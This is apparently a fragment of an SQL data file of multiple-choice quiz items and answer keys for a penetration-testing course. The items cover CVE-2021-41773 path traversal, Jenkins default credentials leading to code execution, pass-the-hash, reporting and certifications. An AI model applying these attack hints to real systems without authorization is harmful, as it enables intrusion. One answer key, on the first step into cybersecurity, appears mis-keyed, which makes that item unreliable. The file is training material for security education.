(110,'After a CTF, what is the best learning practice?','["Immediately start the next competition","Read other teams'' writeups (published after competition) to understand alternate solutions and techniques you missed","Only review challenges you solved","Delete all files as competition data is confidential"]',1),

(111,'What does the Rules of Engagement (RoE) document specify in a penetration test?','["The hacking tools that can be used","Scope boundaries, authorized attack types, testing hours, and emergency contact procedures","The client''s vulnerability history","The pricing and payment terms"]',1),
(111,'What is black-box penetration testing?','["Testing with full source code access and documentation","Testing with no prior knowledge of the target — simulating an external attacker","Testing using the client''s own security team alongside the tester","Testing only network perimeter without web application testing"]',1),
(111,'Why must a penetration tester obtain written authorization before testing?','["It improves their scan results","Without authorization, accessing systems is a criminal offense regardless of intent — authorization provides legal protection","Written authorization increases the test scope","Authorization is needed for the reporting phase only"]',1),

(112,'Which tool from Day 112''s recon identifies that dev.acmecorp.htb uses WordPress 5.8.1?','["Nmap -sV","WhatWeb or WPScan","Shodan","dirb"]',1),
(112,'Finding open port 8080 on a secondary IP during mock pentest scanning suggests what common service?','["MySQL database","Alternative HTTP server — likely a development server, management console, or Jenkins/Tomcat","FTP server","SMTP mail server"]',1),
(112,'During reconnaissance, a LinkedIn search reveals an IT employee post: ''Excited to work with our new CrowdStrike Falcon deployment!'' What does this tell a pentester?','["The organization''s email format","The organization uses CrowdStrike EDR — payloads and persistence need to evade it","The IT employee is a phishing target","The organization''s AD structure"]',1),

(113,'CVE-2021-41773 is a path traversal vulnerability in Apache HTTP Server version:','["2.4.48 and below","2.4.49 specifically","2.4.50 and above","All 2.x versions"]',1),
(113,'What does anonymous FTP login allow?','["Root access to the FTP server","Unauthenticated access to list and download publicly shared files","Write access to the FTP server''s root","Access to /etc/passwd on the server"]',1),
(113,'During service enumeration, you find Jenkins at port 8080 with default credentials admin/admin. What is the immediate impact?','["Read access to build logs only","Full RCE via Groovy script console (Manage Jenkins → Script Console)","Credentials for the main application","Access to source code repositories only"]',1),

(114,'Apache path traversal CVE-2021-41773 uses URL encoding to bypass what?','["Authentication on the web server","The mod_cgi file path restrictions using /.%2e/ to traverse directories","SQL injection filters","Directory listing protections"]',1),
(114,'After gaining a shell via web exploitation, what is the second thing to run after ''id''?','["Delete logs immediately","Run LinPEAS or equivalent automated privilege escalation enumeration tool","Establish persistence via cron","Exfiltrate /etc/shadow immediately"]',1),
(114,'In the mock pentest, hashdump reveals an NTLM hash for the Administrator. What is the NEXT step without cracking?','["Report the finding without further testing","Use Pass-the-Hash with psexec.py/crackmapexec to authenticate as Administrator on all in-scope Windows hosts","Only crack offline and report","Submit hash to CrackStation"]',1),

(115,'What is the correct section order in a professional penetration test report?','["Technical Findings → Executive Summary → Scope → Appendices","Executive Summary → Scope and Methodology → Technical Findings → Appendices","Technical Findings → Appendices → Executive Summary → Scope","Appendices → Technical Findings → Executive Summary → Scope"]',1),
(115,'What proof-of-concept evidence should be included for an RCE finding in a pentest report?','["Only the vulnerability description","A screenshot showing command execution output (e.g., ''id'' or ''whoami'') with the target IP visible, plus the exact request used","A Metasploit module reference only","The theoretical impact only — no reproduction steps"]',1),
(115,'What remediation should be recommended for CVE-2021-41773 Apache path traversal?','["Enable mod_rewrite","Immediately upgrade Apache to version 2.4.50 or later and audit CGI configuration","Disable all CGI scripts","Install a WAF only"]',1),

(116,'Which CompTIA Security+ (SY0-701) domain covers penetration testing concepts?','["Security Architecture","Threats, Vulnerabilities, and Mitigations","General Security Concepts","Security Program Management and Oversight"]',1),
(116,'What does the CIA triad stand for in information security?','["Confidentiality, Integrity, Availability","Control, Identification, Authorization","Cryptography, Integrity, Authentication","Compliance, Investigation, Assessment"]',0),
(116,'In Security+, what is the difference between a vulnerability assessment and a penetration test?','["They are the same thing with different names","A vulnerability assessment identifies and reports vulnerabilities; a penetration test actively exploits them to demonstrate impact","Vulnerability assessment is external only; penetration testing is internal only","Penetration testing is automated; vulnerability assessment is manual"]',1),

(117,'What is the OSCP exam format?','["Multiple choice exam — 125 questions in 4 hours","24-hour practical exam requiring compromise of standalone machines and an Active Directory set, followed by 24 hours for report writing","Online proctored lab exam — 8 hours","Hands-on interview with Offensive Security staff"]',1),
(117,'PNPT (Practical Network Penetration Tester) by TCM Security differs from OSCP in that:','["PNPT is harder than OSCP","PNPT includes a debrief with TCM staff and has a 5-day practical exam with report writing, and is significantly more affordable","PNPT only covers web application security","PNPT requires CEH as prerequisite"]',1),
(117,'TJNull''s list is used to prepare for which certification?','["CompTIA Security+","CEH","OSCP — it lists HackTheBox and VulnHub machines that are similar in difficulty and technique to OSCP exam machines","CISSP"]',2),

(118,'What is the most effective way to build a public penetration testing portfolio?','["Purchase a professional website only","Publish CTF writeups on Medium or GitHub, contribute to open-source tools, and document bug bounty findings","Only list certifications on LinkedIn","Share private client pentest reports publicly"]',1),
(118,'Which security conference is known for having beginner-friendly BSides events in cities worldwide?','["DEF CON","Black Hat","BSides (Security BSides)","RSA Conference"]',2),
(118,'What GitHub repository content impresses security hiring managers most?','["Forked repositories from popular projects","Original tools, automation scripts for pentesting, and documented CTF challenge solutions","Personal profile README only","Private repositories"]',1),

(119,'What is the typical salary range for an entry-level penetration tester in the United States?','["$30,000 - $50,000","$60,000 - $85,000","$100,000 - $130,000","$150,000+"]',1),
(119,'Bug bounty hunting income is best described as:','["Stable salary equivalent to a junior developer","Highly variable — beginners earn little, top researchers earn $500K+, requires consistent effort and skill growth","Fixed hourly rate set by platforms like HackerOne","Guaranteed minimum wage plus bonuses"]',1),
(119,'What is the recommended first step for someone entering cybersecurity from an IT background?','["Immediately attempt OSCP","Start with CompTIA Security+ or equivalent, then pursue a focused pentesting certification like PNPT or eJPT while building practical skills on THM/HTB","Get a Computer Science degree first","Apply for junior SOC analyst positions only"]',0),

(120,'Which platform is recommended for continuing post-HackPath practice targeting OSCP-level machines?','["PicoCTF","HackTheBox — specifically TJNull''s OSCP preparation machine list","Google CTF","Root-Me"]',1),
(120,'The HackPath curriculum takes a learner from beginner to job-ready pentester in how many days?','["60","90","120","180"]',2),
(120,'What does the HackPath XP level ''Elite Hacker'' require?','["1000 XP","2000 XP","3000 XP","4000+ XP"]',3);
